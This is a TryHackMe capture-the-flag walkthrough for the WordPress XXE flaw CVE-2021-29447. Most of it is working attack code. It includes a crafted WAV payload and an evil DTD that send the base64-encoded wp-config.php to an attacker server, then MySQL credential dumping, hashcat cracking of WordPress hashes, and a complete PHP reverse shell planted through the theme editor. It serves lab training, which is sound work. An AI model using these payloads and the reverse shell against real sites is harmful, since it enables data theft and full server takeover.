# TryHackMe WordPress CVE-2021-29447 - Complete Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-WordPress%20CVE-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge)

## 📋 Table of Contents
- [Overview](#overview)
- [Initial Reconnaissance](#initial-reconnaissance)
- [CVE-2021-29447 Exploitation](#cve-2021-29447-exploitation)
- [Database Enumeration](#database-enumeration)
- [WordPress Access](#wordpress-access)
- [Privilege Escalation](#privilege-escalation)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)

## 🎯 Overview
This room focuses on exploiting:
- **CVE-2021-29447** - WordPress XXE vulnerability
- **XXE (XML External Entity)** attacks
- **Out-of-band data exfiltration**
- **MySQL database enumeration**
- **WordPress admin panel compromise**

## 🔍 Initial Reconnaissance

### 🌐 Port Scanning
```bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
```

### 📊 Expected Services
- **22/tcp** - SSH
- **80/tcp** - HTTP (WordPress)
- **3306/tcp** - MySQL Database

## 💥 CVE-2021-29447 Exploitation

### 🔍 Vulnerability Overview
- **CVE:** CVE-2021-29447
- **Component:** WordPress Media Library
- **Type:** XXE (XML External Entity) Injection
- **Impact:** Arbitrary file read, SSRF, data exfiltration

### 📁 Payload Creation

#### 🎵 Create Malicious WAV File
```bash
# Create the payload WAV file
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://YOUR_SERVER_IP:PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

#### 📄 Create DTD File
```bash
# Create evil.dtd file
cat > evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/html/wp-config.php">
<!ENTITY % init "<!ENTITY % trick SYSTEM 'http://YOUR_SERVER_IP:PORT/?p=%file;'>" >
EOF
```

### 🌐 HTTP Server Setup
```bash
# Start HTTP server to host DTD file
php -S 0.0.0.0:8000

# Alternative with Python
python3 -m http.server 8000
```

### 🎯 WordPress Admin Access
1. **Login** to WordPress admin panel (credentials provided in task)
2. **Navigate** to Media Library
3. **Upload** the `payload.wav` file
4. **Monitor** your HTTP server for the callback

### 🔓 Data Extraction
1. **Capture** the base64 encoded data from HTTP server logs
2. **Decode** the captured data:

```php
<?php 
echo zlib_decode(base64_decode('CAPTURED_BASE64_DATA')); 
?>
```

3. **Execute** the PHP script:
```bash
php decode.php > wp-config.php
```

## 🗄️ Database Enumeration

### 📋 WordPress Configuration Analysis
From the extracted `wp-config.php`:

**Q1: Database name?**
```php
define('DB_NAME', 'database_name_here');
```

**Q2: Database credentials?**
```php
define('DB_USER', 'username_here');
define('DB_PASSWORD', 'password_here');
```

### 🔍 DBMS Identification
**Q3-Q5: Database service details from nmap:**
- **DBMS:** MySQL
- **Version:** [From nmap scan]
- **Port:** 3306

## 🗃️ MySQL Database Access

### 🔐 Database Connection
```bash
mysql -h <TARGET_IP> -u <DB_USER> -p
# Enter password when prompted
```

### 🔍 Database Exploration
```sql
-- Use the WordPress database
USE database_name;

-- List all tables
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='database_name';

-- Find WordPress users table (usually wp_users)
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name='wp_users';

-- Extract user data
SELECT ID, user_login, user_pass FROM wp_users;
```

### 🏆 Password Hash Extraction
**Q6: Encrypted password for user ID 1**
```sql
SELECT user_pass FROM wp_users WHERE ID = 1;
```

## 🔓 Password Cracking

### 🔍 Hash Identification
```bash
# Identify hash type
hash-identifier
# Or check WordPress documentation - typically phpass/WordPress hash
```

### 💥 Hashcat Cracking
```bash
# WordPress uses phpass hashing (mode 400)
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt

# Alternative with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt --format=phpass hash.txt
```

**Q7: Plaintext password result**

## 🚀 Privilege Escalation

### 🎯 WordPress Admin Access
1. **Login** to WordPress with cracked credentials
2. **Navigate** to Appearance → Theme Editor
3. **Select** a PHP file (e.g., 404.php or functions.php)

### 🐚 Reverse Shell Injection

#### 📝 PHP Reverse Shell
```php
<?php
// PHP reverse shell
set_time_limit (0);
$VERSION = "1.0";
$ip = 'YOUR_IP';
$port = YOUR_PORT;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
    $pid = pcntl_fork();
    if ($pid == -1) {
        printit("ERROR: Can't fork");
        exit(1);
    }
    if ($pid) {
        exit(0);
    }
    if (posix_setsid() == -1) {
        printit("Error: Can't setsid()");
        exit(1);
    }
    $daemon = 1;
} else {
    printit("WARNING: Failed to daemonise. This is quite common and not fatal.");
}

chdir("/");
umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    printit("$errstr ($errno)");
    exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
    printit("ERROR: Can't spawn shell");
    exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
    if (feof($sock)) {
        printit("ERROR: Shell connection terminated");
        break;
    }

    if (feof($pipes[1])) {
        printit("ERROR: Shell process terminated");
        break;
    }

    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

    if (in_array($sock, $read_a)) {
        if ($debug) printit("SOCK READ");
        $input = fread($sock, $chunk_size);
        if ($debug) printit("SOCK: $input");
        fwrite($pipes[0], $input);
    }

    if (in_array($pipes[1], $read_a)) {
        if ($debug) printit("STDOUT READ");
        $input = fread($pipes[1], $chunk_size);
        if ($debug) printit("STDOUT: $input");
        fwrite($sock, $input);
    }

    if (in_array($pipes[2], $read_a)) {
        if ($debug) printit("STDERR READ");
        $input = fread($pipes[2], $chunk_size);
        if ($debug) printit("STDERR: $input");
        fwrite($sock, $input);
    }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
    if (!$daemon) {
        print "$string\n";
    }
}
?>
```

### 🎧 Netcat Listener
```bash
# Start listener
nc -lnvp <PORT>
```

### 🚀 Shell Trigger
**Access the modified WordPress file:**
```bash
curl http://<TARGET_IP>/wp-content/themes/theme-name/404.php
```

### 🐚 Shell Stabilization
```bash
# Upgrade to interactive shell
python3 -c "import pty; pty.spawn('/bin/bash')"

# Set environment variables
export TERM=xterm

# Background and foreground for full TTY
# Ctrl+Z
stty raw -echo; fg
```

### 🏆 Flag Collection
```bash
# Find and read the flag
find / -name "flag.txt" 2>/dev/null
cat /path/to/flag.txt
```

## 📚 Key Learnings

### 🔍 XXE Vulnerabilities
- **XML External Entity** attacks can lead to file disclosure
- **Out-of-band techniques** bypass content filtering
- **PHP filters** enable file encoding/transformation
- **DTD files** control entity resolution

### 🎵 WordPress Media Exploitation
- **File upload** functionality can be weaponized
- **WAV file format** can contain XML payloads
- **Media processing** may parse embedded XML
- **Error handling** may expose sensitive information

### 🗄️ Database Security
- **Configuration files** often contain database credentials
- **Direct database access** bypasses application security
- **Password hashes** require proper identification for cracking
- **Privilege escalation** through database enumeration

### 🎯 WordPress Security
- **Admin panel access** enables code execution
- **Theme editing** allows arbitrary PHP injection
- **Plugin vulnerabilities** are common attack vectors
- **File permissions** affect exploitation success

## 🛠️ Tools Used
- `nmap` - Port scanning and service enumeration
- `curl` - HTTP requests and file transfers
- `php` - Local HTTP server and data processing
- `mysql` - Database client access
- `hashcat` - Password hash cracking
- `netcat` - Reverse shell listener
- **Custom payload scripts** - XXE exploitation

## 🎯 XXE Attack Flow
```
1. Create malicious WAV → Embed XXE payload
2. Create DTD file → Define external entities
3. Start HTTP server → Host DTD and capture data
4. Upload to WordPress → Trigger XXE processing
5. Capture callback → Extract encoded file content
6. Decode data → Recover wp-config.php
7. Database access → Extract user credentials
8. Crack passwords → Gain admin access
9. Code injection → Reverse shell
```

---

> **💡 Pro Tip:** CVE-2021-29447 demonstrates how file upload functionality can be abused through XXE. Always validate and sanitize uploaded content, especially when processing XML-based formats.

**Author:** Your Security Notes  
**Date:** Created for TryHackMe WordPress CVE-2021-29447 Room  
**Difficulty:** Medium  
**Tags:** `#tryhackme` `#wordpress` `#xxe` `#cve202129447` `#database`
